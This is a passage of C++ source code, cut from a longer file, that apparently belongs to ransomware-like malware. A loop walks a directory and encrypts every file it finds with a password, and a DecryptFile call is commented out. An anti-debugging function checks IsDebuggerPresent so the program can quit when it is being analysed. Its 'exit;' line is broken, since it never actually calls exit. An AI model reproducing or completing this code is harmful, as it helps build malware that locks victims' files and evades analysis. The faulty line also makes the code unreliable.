		EncryptFile((LPWSTR)fullPathToFile.c_str(), (LPWSTR)pszDestinationFile.c_str(), (LPWSTR)pszPassword.c_str());
		//DecryptFile((LPWSTR)PathOfDir.c_str(), (LPWSTR)pszDestinationFile.c_str(), (LPWSTR)pszPassword.c_str());
		}
	} while (FindNextFile(hFind, &ffd) != 0);
	return 0;
}


BOOL AntiDebugMethods() {
	BOOL isDebugged = IsDebuggerPresent();
	if (isDebugged) {
		//exit from my app
		
		exit;
		return TRUE;
	}
	return FALSE;
}